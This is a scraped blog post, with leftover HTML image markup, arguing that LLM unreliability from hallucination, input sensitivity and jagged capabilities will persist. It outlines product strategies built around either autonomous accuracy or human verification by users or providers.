https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F463fb0b9-1521-458c-a488-081546b0a15b_935x289.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F463fb0b9-1521-458c-a488-081546b0a15b_935x289.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F463fb0b9-1521-458c-a488-081546b0a15b_935x289.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F463fb0b9-1521-458c-a488-081546b0a15b_935x289.png" width="652" height="201.52727272727273" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/463fb0b9-1521-458c-a488-081546b0a15b_935x289.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:289,&quot;width&quot;:935,&quot;resizeWidth&quot;:652,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F463fb0b9-1521-458c-a488-081546b0a15b_935x289.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F463fb0b9-1521-458c-a488-081546b0a15b_935x289.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F463fb0b9-1521-458c-a488-081546b0a15b_935x289.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F463fb0b9-1521-458c-a488-081546b0a15b_935x289.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>This is a case where hallucinations really shouldn't have happened, the correct context was provided, the chatbot merely needed to format a citation</figcaption></figure></div></li><li><p><span>Theoretical work indicates that a non-zero probability of hallucination is an </span><a href="https://arxiv.org/abs/2409.05746" rel="">inherent</a><span> and </span><a href="https://arxiv.org/abs/2401.11817" rel="">unavoidable</a><span> characteristic of LLMs.</span></p></li><li><p><span>As avid users, we can attest firsthand: </span><strong>while skill can help mitigate failures, it is nowhere near sufficient for full reliability</strong><span>.</span></p></li></ol></li></ol><ol start="2"><li><p>These reliability issues get worse when LLMs act as agents, systems that must orchestrate tools, interact with software, and carry out multi-step tasks. Empirical results across a range of the most rigorously constructed agent evaluation benchmarks show agentic AI performance well below human levels, and worse, the rate and nature of these failures (their unpredictability and chance that they can happen at ‚Äúany time‚Äù) make these systems unusable.</p><ol><li><p>Partial list:</p><ol><li><p><a href="https://the-agent-company.com/#/leaderboard" rel="">The Agent Company</a><span>, </span><a href="https://arxiv.org/html/2502.15840v1" rel="">Vending-Bench</a><span>, </span><a href="https://www.realevals.xyz/" rel="">Realistic Evaluations for Agents Leaderboard</a><span>, </span><a href="https://hal.cs.princeton.edu/taubench_airline" rel="">HAL: TAU-bench Airline</a><span>, </span><a href="https://os-world.github.io/" rel="">OSWorld</a><span>, </span><a href="https://huggingface.co/spaces/gaia-benchmark/leaderboard" rel="">GAIA Leaderboard</a></p></li></ol></li></ol></li><li><p><strong>Code generation</strong><span> is one of the most mature use cases for LLMs‚Äîand even here, the same reliability issues persist. Widely cited research from </span><a href="https://metr.org/blog/2025-03-19-measuring-ai-ability-to-complete-long-tasks/" rel="">METR</a><span>, arguably the most thorough study of LLM code performance to date, suggests that reaching 99% correctness is only feasible for code a human could write in under a </span><a href="https://epoch.ai/gradient-updates/where-is-my-ten-minute-agi" rel="">minute</a><span>. There are caveats (including how human baselines are estimated), but the core insight holds: even with strong feedback signals and tightly scoped tasks, LLMs still make small, consequential mistakes‚Äîmaking truly high-accuracy code output surprisingly difficult to achieve. </span></p></li><li><p><span>LLMs are highly </span><strong>input-sensitive</strong><span>. </span><a href="https://arxiv.org/pdf/2406.10248" rel="">Minor</a><span>, even purely </span><a href="https://arxiv.org/html/2504.01282v1#:~:text=driven%20by%20randomness.-,Paraphrase%20Inconsistency.,-Elazar%20et%C2%A0al" rel="">cosmetic</a><span>, changes to prompts can produce wildly different outputs, undermining predictability and confidence in test results</span></p><ol><li><p>This ties back to the core strength of LLMs: their flexibility. You don‚Äôt need to know the exact input in advance, that‚Äôs why we use them. But it also means that performance on ‚Äúin-distribution‚Äù test cases doesn‚Äôt tell you much about how the model will perform in the wild. </p></li></ol></li><li><p><strong>Alignment</strong><span>. We won‚Äôt dive into the full complexity of the alignment discussion here‚Äîit‚Äôs a deep and important topic‚Äîbut the basic idea is this: alignment is the discipline concerned with making sure that models behave, at a high level, the way we intend them to. It‚Äôs what tries to prevent scenarios where an LLM blackmails its developer to avoid being shut off, or gives users instructions on how to build bioweapons. It‚Äôs a critical area of research, and very much </span><a href="https://x.com/aengus_lynch1/status/1925746802147426450" rel="">not</a><span> a </span><a href="https://x.com/ARGleave/status/1926138376509440433" rel="">solved</a><span> one. Beyond just illustrating how fundamentally opaque these systems still are, unsolved alignment directly impacts the viability of agentic LLM use cases. But as noted, this is a topic worthy of its own deep dive, so we‚Äôll leave it at that for now. </span></p></li></ol><p><strong>Forecasting AI progress is notoriously difficult</strong><span>, especially in a domain evolving this quickly. That said, we have reason to believe that the core reliability dynamics of LLMs aren‚Äôt likely to change meaningfully in the short to medium term.</span></p><p>Here‚Äôs why:</p><ol><li><p><span>A key reason we believe these reliability issues will persist is the way LLM errors interact with task complexity. Our own observations (and interpretations of much of the available research and empirical findings), suggest that LLM failure modes compound with task length in ways that </span><a href="https://www.tobyord.com/writing/half-life#:~:text=increasing%20time%20periods%3A-,Intriguingly,-%2C%20this%20human%20survival" rel="">exceed</a><span> typical human error patterns. This tendency for AI errors to multiply and cascade will, we suspect, remain a fundamental barrier for truly reliable agentic systems for the foreseeable future. </span></p></li><li><p><span>The fact that no LLM use case has demonstrated true determinism in real-world applications is significant. It strongly supports the theoretical arguments discussed earlier, which posit that </span><strong>hallucinations are an unavoidable, and likely unsolvable</strong><span>, aspect of current LLM architectures. </span></p></li><li><p><span>A striking example of LLMs' operational opacity comes from Anthropic's research, illustrated by how a model might calculate 36+59=95. Internally, it uses a sophisticated, multi-path strategy, approximating the sum with one heuristic while precisely determining the final digit with another. Yet, if asked to explain its calculation, the LLM describes the standard 'carry the one' algorithm taught to humans. This suggests the model lacks the mechanism to introspect and articulate the actual computational path it took. This inability to reflect post hoc‚Äîeven to itself‚Äîunderscores the black-box nature of LLMs. While speculative, we suspect </span><strong>this missing self-awareness contributes to their unreliability</strong><span>.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde692a44-d80d-4209-9f9b-0acaeaf4d6f3_1600x829.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde692a44-d80d-4209-9f9b-0acaeaf4d6f3_1600x829.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde692a44-d80d-4209-9f9b-0acaeaf4d6f3_1600x829.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde692a44-d80d-4209-9f9b-0acaeaf4d6f3_1600x829.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde692a44-d80d-4209-9f9b-0acaeaf4d6f3_1600x829.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde692a44-d80d-4209-9f9b-0acaeaf4d6f3_1600x829.png" width="1456" height="754" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/de692a44-d80d-4209-9f9b-0acaeaf4d6f3_1600x829.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:754,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde692a44-d80d-4209-9f9b-0acaeaf4d6f3_1600x829.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde692a44-d80d-4209-9f9b-0acaeaf4d6f3_1600x829.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde692a44-d80d-4209-9f9b-0acaeaf4d6f3_1600x829.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde692a44-d80d-4209-9f9b-0acaeaf4d6f3_1600x829.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption><span>‚ÄúClaude </span><a href="https://www.anthropic.com/news/tracing-thoughts-language-model" rel="">seems </a><span>to be unaware of the sophisticated "mental math" strategies that it learned during training. If you ask how it figured out that 36+59 is 95, it describes the standard algorithm involving carrying the 1‚Äù</span></figcaption></figure></div></li><li><p><span>The </span><em><strong><a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=4573321" rel="">jaggedness</a></strong></em><strong> of AI capabilities</strong><span> remains a major driver of unreliability. Models can demonstrate </span><a href="https://epoch.ai/gradient-updates/is-ai-already-superhuman-on-frontiermath" rel="">superhuman performance on advanced mathematics</a><span>, yet still fail spectacularly on basic arithmetic. This inconsistency‚Äîseen across many domains‚Äîmakes complex, multi-step tasks especially fragile: a single failure in an otherwise simple step the model happens to be bad at can drastically increase the overall error rate. </span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F031f38cc-7160-4628-9ca5-e148defbdf3d_501x379.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F031f38cc-7160-4628-9ca5-e148defbdf3d_501x379.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F031f38cc-7160-4628-9ca5-e148defbdf3d_501x379.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F031f38cc-7160-4628-9ca5-e148defbdf3d_501x379.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F031f38cc-7160-4628-9ca5-e148defbdf3d_501x379.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F031f38cc-7160-4628-9ca5-e148defbdf3d_501x379.jpeg" width="501" height="379" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/031f38cc-7160-4628-9ca5-e148defbdf3d_501x379.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:379,&quot;width&quot;:501,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:24437,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F031f38cc-7160-4628-9ca5-e148defbdf3d_501x379.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F031f38cc-7160-4628-9ca5-e148defbdf3d_501x379.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F031f38cc-7160-4628-9ca5-e148defbdf3d_501x379.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F031f38cc-7160-4628-9ca5-e148defbdf3d_501x379.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div></li></ol><p>We see two strategic tracks for building around LLM variance‚Äî(1) systems that operate without user verification, and (2) systems that manage verification explicitly. Each further breaks down into two distinct approaches.</p><ol><li><p><strong>Autonomy</strong></p><ol><li><p><strong>Determinism</strong></p></li><li><p><strong>Accurate enough</strong></p></li></ol></li><li><p><strong>Human in the loop</strong></p><ol><li><p><strong>End-user verification</strong></p></li><li><p><strong>Verification at the provider level</strong></p></li></ol></li></ol><p>These paths differ significantly in their strengths, the demands they place on development teams, and the sources of competitive advantage they offer. The following sections will unpack each one in turn.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f56f383-5a6c-406b-abd2-c0386b9bee35_624x271.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f56f383-5a6c-406b-abd2-c0386b9bee35_624x271.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f56f383-5a6c-406b-abd2-c0386b9bee35_624x271.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f56f383-5a6c-406b-abd2-c0386b9bee35_624x271.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f56f383-5a6c-406b-abd2-c0386b9bee35_624x271.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f56f383-5a6c-406b-abd2-c0386b9bee35_624x271.png" width="624" height="271" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/0f56f383-5a6c-406b-abd2-c0386b9bee35_624x271.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:271,&quot;width&quot;:624,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f56f383-5a6c-406b-abd2-c0386b9bee35_624x271.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f56f383-5a6c-406b-abd2-c0386b9bee35_624x271.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f56f383-5a6c-406b-abd2-c0386b9bee35_624x271.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f56f383-5a6c-406b-abd2-c0386b9bee35_624x271.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>This first broad strategy focuses on creating systems where the AI's output is intended to be used directly, without an explicit verification step by the end-user for each instance. </p><p><span>This includes systems that incorporate internal exception handling, where the system itself can detect inputs or scenarios it cannot process to the required standard of reliability and then gracefully manage these exceptions (e.g., by flagging them, routing to a different process, or informing the user it cannot proceed). The key concept here is allowing the system to 'run without babysitting', requiring additional capacity for when the system flags </span><strong>exceptions </strong><span>(usually means you need manpower) doesn't change this underlying dynamic. </span></p><p>This is the only category that enables fully autonomous usage, systems that can operate without human intervention. That makes it arguably the highest-margin path, with the clearest ROI story: either an existing process becomes faster, cheaper, and more scalable, or a new one becomes viable, and in both cases, the value is easy to measure. You can point to what the system does, what it improves, and what it costs.</p><h5>This can be pursued in several ways: </h5><p><span>The aim here is to engineer an LLM-based system that, for all practical purposes, achieves complete determinism, mirroring the reliability of traditional software. Realizing this requires a system capable of exhaustively testing its outputs against rigorous criteria and, critically, remediating nearly all conceivable LLM-generated issues. Companies like </span><a href="https://www.skyramp.dev/" rel="">Skyramp</a><span>, focusing on deterministic AI for test generation, are exploring aspects of this space.</span></p><p>In practice, attaining this level of comprehensive determinism is extraordinarily challenging. It necessitates absolute confidence in having identified and addressed all potential edge cases and failure modes, a feat few if any have achieved in practice. </p><h5>What defines this approach</h5><ul><li><p>This approach demands deep AI technical expertise. Getting an LLM-based system to behave deterministically is extremely hard, and being confident that it actually does requires a sophisticated understanding of how and where LLMs can fail. Unless the problem is already widely solved, teams must be able to both achieve high accuracy and rigorously validate it across edge cases. </p></li><li><p>Such a system likely requires a very sophisticated engineering layer, IP-worthy at that, this dynamic serves as a moat from both ‚Äúmodels getting better" and competitors.</p><ul><li><p><span>This does mean that there are likely serious demands for quality engineering talent as well, and depending on specifics, specialized talent (who </span><a href="https://en.wikipedia.org/wiki/Cyberwarfare" rel="">else</a><span> has experience in thinking about a system‚Äôs weak points?).</span></p></li></ul></li><li><p>Your customer needs to trust you, really trust you that your tech does what it says it does, earning their trust may not be easy, but if you do, that is another source of competitive advantage.</p></li></ul><p>This path focuses on achieving a level of accuracy that is 'good enough' for a particular application where direct, instance-by-instance user verification is not part of the primary workflow, and occasional errors are within acceptable tolerance. </p><p>A critical requirement is achieving and validating a high degree of confidence that you have thoroughly accounted for all significant edge cases and the varied ways your LLM product can fail within the specific operational context.</p><h5>Examples: </h5><ul><li><p><span>An </span><strong>AI classifier</strong><span> designed for very large, unstructured datasets, used for broad-based trend analysis. Here, occasional misclassifications can be tolerated as they are unlikely to skew the overall insights significantly.</span></p></li><li><p><span>Automated </span><strong>structured data extraction</strong><span> from documents (like invoices or forms), where the system achieves a </span><a href="https://rossum.ai/customer-stories/adyen/" rel="">high enough accuracy for</a><span> direct use in downstream processes, with the understanding that a very small residual error rate is acceptable.</span></p></li><li><p><span>AI-powered </span><strong>note-takers</strong><span> for meetings. In many common usage patterns, there's no explicit human check on the generated notes. The underlying logic is often that notes with minor errors or omissions still offer greater utility than the alternatives of laborious manual note-taking or having no record at all.</span></p></li></ul><h5>What defines this approach: </h5><ol><li><p><span>For this strategy, it's critical to </span><strong>deeply analyze the user's workflow</strong><span> and the actual consequences of different AI failure modes (e.g., overgeneralization vs. complete fabrication, missed information vs. incorrect information). This involves an in-depth mapping of how various errors will impact the user's objectives and risk exposure. </span><strong>Crucially, developers must recognize that users themselves can be poor judges of these risks or may be overly trusting</strong><span>, as evidenced by ongoing issues like professionals misusing LLMs in critical fields despite widely known failure patterns (e.g., </span><a href="https://www.damiencharlotin.com/hallucinations/" rel="">at least 20 cases</a><span> of legal decisions where AI produced hallucinations just this month, despite hallucinations in law being a high-profile failure mode for </span><a href="https://www.nytimes.com/2023/12/29/nyregion/michael-cohen-ai-fake-cases.html" rel="">years</a><span>). The onus is on the product team to anticipate these issues, understand the true (not just stated) risk tolerance, and design accordingly, rather than solely relying on users to self-regulate their trust.</span></p></li><li><p><span>While perhaps less demanding than striving for proper determinism, it still requires </span><strong>strong enough AI skills to know what accuracy actually means in context</strong><span>, how to measure it, interpret it, and design around it. </span></p></li><li><p><span>For this strategy, the central aspect of product design is ensuring the product's </span><strong>core AI performance</strong><span> (its accuracy and reliability) is properly calibrated. While usability is always a factor, it's secondary here to achieving the target performance level. </span></p></li><li><p><span>Customers must </span><strong>trust the product's defined level of accuracy</strong><span>. This requires demonstrating consistent performance within those bounds, which can then become a key differentiator and competitive moat. </span></p></li></ol><p>Unlike approaches that strive to engineer out all AI variance, the second broad strategy for LLM product development accepts a degree of inherent model variability and focuses on managing its impact by integrating human verification into the process. </p><p><span>This common approach involves creating products where the </span><strong>end-user directly reviews, validates, and potentially corrects the AI's output as part of their workflow</strong><span>. To succeed, the value proposition must clearly justify the user's verification effort; the AI's assistance, even if imperfect, must be preferable to alternatives. </span></p><ul><li><p>Examples</p><ul><li><p><strong>Search &amp; discovery tools</strong><span> (e.g., web search, shopping search): Users often don't need every possible correct answer and can tolerate some irrelevant results if the tool quickly surfaces useful or intriguing information.</span></p></li><li><p><strong>Information triage</strong><span> (e.g., "important document" finders in email): An AI might flag potentially missed invoices or critical communications. The user quickly verifies if the flagged items are indeed relevant, a task easier than manually sifting through everything.</span></p></li><li><p><strong>Powerful general-purpose chatbots</strong><span>: LLMs via the chat interface are so broadly capable that users find ways to derive utility despite needing to critically evaluate responses and manage occasional errors.</span></p></li><li><p><strong>"Copilot" paradigms</strong><span> (e.g., coding assistants like Cursor, legal tools like Harvey, etc.): The AI generates drafts or suggestions (code, legal clauses, analyses), and the expert user, who is "in the loop" at the right time, can quickly identify and correct issues.</span></p></li><li><p><strong>Creative ‚Äúcontent generation‚Äù</strong><span>: These are the canonical examples. Users can easily assess if the output‚Äôs style and basic coherence are suitable.</span></p></li></ul></li></ul><h5>What defines this approach</h5><ul><li><p><strong>Workflow augmentation:</strong><span> These products almost always enhance a specific user persona‚Äôs workflow rather than fully automating a standalone function (there‚Äôs also a small class of ‚Äúalerting‚Äù use cases, but we assess that category to be relatively limited). This stems directly from the need for human verification: when humans are in the loop, they‚Äôre usually using the AI to do their job better, not babysitting it. In other words, the AI augments the human, not the other way around. While you can design a system where a human simply verifies AI outputs, that pattern rarely proves compelling in practice. The output has to be so valuable that it justifies paying someone to check it, and most applications don‚Äôt clear that bar. </span></p></li><li><p><strong>Ceiling more than floor</strong><span>: Since this approach often involves users adopting new ways of working, the "ceiling" of value, the significant benefit derived from the AI's best or most insightful contributions, must be exceptionally high. This potential for substantial gains (e.g., speed, unique insights, quality improvements) is instrumental in justifying a change in work pattern and earn the user's verification effort. The focus is less on average AI accuracy ("floor") and more on the transformative potential of the AI's peak contributions.</span></p></li><li><p><strong>Usability is central</strong><span>: Since user interaction and verification are integral, nailing the UI/UX for verification, correction, and seamless integration into the user's existing or new workflow is vital. Quality of user experience is then the primary differentiator and source of competitive advantage.</span></p></li><li><p><strong>Designed for verifiability</strong><span>: A central characteristic is the design of AI outputs that are easily and reliably verifiable by the intended skilled end-user. This involves careful consideration of information presentation, the nature of the AI‚Äôs output, and ensuring the </span><a href="https://arxiv.org/html/2505.08063v1#:~:text=3.1.,Task%20Performance" rel="">right </a><span>user is targeted (e.g., AI accounting tools for accountants who can vet the suggestions).</span></p></li></ul><p><span>This distinct model places the responsibility for </span><strong>verification and</strong><span> </span><strong>ensuring the quality of the final output squarely on the product or service provider</strong><span>. This involves the provider's own internal human review processes, often working in concert with AI and specialized software to deliver a "done-for-you," result. From the customer's perspective, the AI's imperfections are handled "behind the curtain."</span></p><p>The end-user perceives this as an "AI-powered service". Usually, this involves the provider taking over a specific, often narrow, function previously handled by the client, fulfilling it in a third-party services style. The client receives a completed task or a digestible deliverable, effectively outsourcing the complexity of managing the AI and its potential variance.</p><h5>What defines this approach</h5><ol><li><p><strong>Specialized, narrow-scope offerings with optimized playbooks</strong><span>: Real value and defensibility are typically unlocked when a provider identifies a narrow scope‚Äîa specific, well-defined problem or function that can be demonstrably and massively improved with AI. This focus is critical because:</span></p><ol><li><p>Identifying such improvable functions and developing effective playbooks is a key capability in itself; achieving this across broader, more general functions is significantly more challenging.</p></li><li><p><span>As empirical findings to date </span><a href="https://www.oneusefulthing.org/p/making-ai-work-leadership-lab-and" rel="">suggest,</a><span> simply layering AI onto existing broad processes (as some "</span><a href="https://techcrunch.com/2025/05/23/khosla-ventures-among-vcs-experimenting-with-ai-infused-roll-ups-of-mature-companies/" rel="">rollup</a><span>" strategies might attempt) often falls short of delivering significant productivity gains. True transformation typically requires a fundamental redesign of how work is done, which is most feasible within a narrow, provider-controlled scope.</span></p></li><li><p>Investing in a dedicated software layer around the LLM for a provider-managed workflow (e.g., specialized internal UIs, tailored integrations, automation scripts) typically yields a high return on investment. However, this level of impactful, specialized engineering is generally only feasible when the operational scope is narrowly defined; it becomes impractical or offers diminishing returns for overly broad, general-purpose applications.</p></li></ol></li><li><p><strong>AI integration &amp; workforce management</strong><span>: The provider's operational ability to effectively integrate AI tools with their skilled human workforce to genuinely maximize productivity and quality is essential.</span></p></li><li><p><strong>The pivotal role of domain expertise</strong><span>: This expertise is necessary for designing effective AI-augmented workflows, facilitating effective quality control, and ensuring the final output meets exacting client standards. This expertise becomes a significant competitive differentiator.</span></p></li><li><p><strong>Provider control optimizes outcomes</strong><span>: A key advantage is that the provider designs and controls the optimal internal flow for how the AI is best used. There's no need to train end-users on the nuances of AI interaction (e.g., prompt engineering, watching for hallucinations), which removes a whole class of failure that no longer needs to be accounted for and gives the provider quite a wide margin of tolerable variance rates.</span></p></li><li><p><strong>Providers have a strategic choice regarding transparency</strong><span>: whether or not to explicitly inform end-users that AI was involved in producing the service or deliverable.</span></p></li><li><p><span>The business dynamics closely resemble those of </span><strong>specialized, high-value third-party service providers</strong><span>. Brand reputation for quality, reliability, and deep expertise is paramount.</span></p></li><li><p>Subject to the amount of specialization, the addressable market for any single offering may be smaller, making a strategy of "dominating your pond" or achieving leadership in a specific niche essential for success.</p></li></ol><p>Oh we should have mentioned, there is technically one more strategy available‚Ä¶</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff8e0c90e-3a93-484c-9629-0027b07b0e23_898x308.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff8e0c90e-3a93-484c-9629-0027b07b0e23_898x308.png 